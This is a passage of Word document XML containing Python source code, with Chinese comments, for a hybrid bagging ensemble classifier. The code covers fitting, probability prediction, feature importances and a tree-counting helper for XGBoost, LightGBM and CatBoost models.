          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                fit_kwargs["sample_weight"] = weights[boot]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68417BEA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            est.fit(X[np.ix_(boot, feats)], member_le.transform(y_sub), **fit_kwargs)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61D66D14">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="48935BFF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            self.estimators_.append(est)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DFE235B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            self.feature_indices_.append(feats)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4089B825">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            # 单个 bootstrap 可能没抽到稀有类，记下这个成员实际覆盖了哪几类，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EAD9296">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            # 预测时把概率散射回全宽，否则列数对不上会静默错位</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E4B19F2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            self.member_classes_.append(member_le.classes_)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60BC0373">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            self.learner_kinds_.append(kind)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FF0AE41">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6BCD8840">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if not self.estimators_:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13960C9D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            raise RuntimeError("没有基学习器训练成功，检查 base_pool / 数据类别分布")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0848339D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5595FD3C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.estimator_counts_ = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CF9D24F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            k: self.learner_kinds_.count(k) for k in dict.fromkeys(self.learner_kinds_)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DEB8864">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7127E17A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return self</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F23390D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="128C79D9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    # ------------------------------------------------------------------- 预测</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6ECEF367">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3DE3345C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def predict_proba(self, X):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60512E6D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        check_is_fitted(self, "estimators_")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C6B15F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        X = self._validate_X(X)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="384ECAEA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        proba = np.zeros((X.shape[0], len(self.classes_)), dtype=np.float64)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24472201">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        for est, feats, classes_idx in zip(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="238513B5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            self.estimators_, self.feature_indices_, self.member_classes_</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24FD03DA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        ):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27D9E50A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            proba[:, classes_idx] += est.predict_proba(X[:, feats])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A3E004E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return proba / len(self.estimators_)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="372FA585">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0BF02DE4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def predict(self, X):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21F078D8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        proba = self.predict_proba(X)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11EA16D2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return self.classes_[np.argmax(proba, axis=1)]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="212C16A9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6D465EDC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    # --------------------------------------------------------------- 可解释性</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="544E3111">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7EA50242">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    @property</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70057E4F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def feature_importances_(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A22A78E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        check_is_fitted(self, "estimators_")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="349571FC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        total = np.zeros(self.n_features_in_, dtype=np.float64)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="223B1110">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        hits = np.zeros(self.n_features_in_, dtype=np.float64)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4803D1EA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        for est, feats in zip(self.estimators_, self.feature_indices_):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CA94A15">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            imp = getattr(est, "feature_importances_", None)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F7BBECC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            if imp is None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7646C3AA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                continue</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FC57CA5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            total[feats] += np.asarray(imp, dtype=np.float64)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="459E18BC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            hits[feats] += 1.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F0310A8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        denom = np.maximum(hits, 1.0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5504E9B3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return total / denom</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CA17B4C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="31C04C22">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7797C227">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def count_trees(model):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1925A9EE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """实际建成的树数，用于报告里的成本表。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B09D23C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="01B854C4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    不能按"轮数"报：XGBoost / LightGBM 多分类每轮每类各长一棵树，差 n_classes 倍；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DC0798A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    CatBoost MultiClass 每轮只长一棵树（叶子是多维向量），轮数即树数。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62CF2ECE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="092A1786">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if isinstance(model, HybridForest):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A7B913B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return sum(count_trees(e) for e in getattr(model, "estimators_", []))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41DE8F06">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if hasattr(model, "estimators_") and isinstance(model.estimators_, (list, np.ndarray)):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C6794E2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return int(sum(count_trees(e) for e in model.estimators_))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D1FC143">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
